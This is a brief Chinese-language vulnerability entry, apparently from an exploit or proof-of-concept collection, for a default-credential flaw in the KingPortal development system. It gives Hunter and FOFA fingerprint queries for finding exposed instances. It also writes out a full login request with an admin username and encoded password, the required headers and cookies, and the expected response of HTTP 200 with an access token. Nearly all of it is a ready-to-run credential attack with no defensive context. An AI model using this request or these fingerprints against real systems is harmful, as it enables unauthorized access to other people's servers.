# KingPortal开发系统弱口令漏洞

- **系统**：KingPortal　|　**类型**：默认口令　|　**CVE**：—
- **指纹**：`Hunter: web.title="KingPortal"或fofa:title="KingPortal"`
- **请求**：`GET /login?username=admin001&password=VHBD8afsBVQ5AZpEZiipxxQ6CoibfT%2BncF%2BUdvcbiNGvXmKrtdlyYlvUpAh0UzCm9MmhqFLQiWh3hRrliwE%2B9g%3D%3D%3F4vUqaZBD8quF6sl70YZY7ySlMm5SzG8zEAQf02pA704%3D&city=127.0.0.1+%E6%9C%AA%E7%9F%A5&_=1714986142803 HTTP/1.1`
- **关键头**：`Authorization: Bearer null`　`X-Requested-With: XMLHttpRequest`　`onces: 3iQrIuJQEj5TPTR5`　`projectname: null`　`requesttime: 1714986236944`　`Cookie: SECKEY_ABVK=qNcju4NZuPhtd4B1VG7KNzf17hN93asN1mL3Xe/Vab4%3D; BMAP_SECKEY=qNcju4NZ…`
- **预期**：200　|　access_token